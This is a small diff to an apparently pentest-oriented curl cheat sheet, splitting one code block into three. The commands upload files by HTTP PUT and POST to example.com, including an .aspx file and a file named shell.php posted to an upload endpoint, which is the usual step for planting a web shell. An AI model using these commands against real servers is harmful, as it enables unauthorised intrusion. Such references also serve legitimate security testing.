@@ -10,10 +10,14 @@ tags: ["curl", "http", "file transfer", "web"]
 ```bash
 # PUT request with a file
 curl -X PUT http://example.com/test.txt -d @test.txt
+```
 
+```bash
 # Upload as binary (preserve newlines and control characters)
 curl -X PUT http://example.com/test.txt --data-binary @test.aspx
+```
 
+```bash
 # POST request with with form param `file`
 curl -X POST -F "file=@shell.php;type=application/php;filename=shell.php" 'http://example.com/upload'
 ```
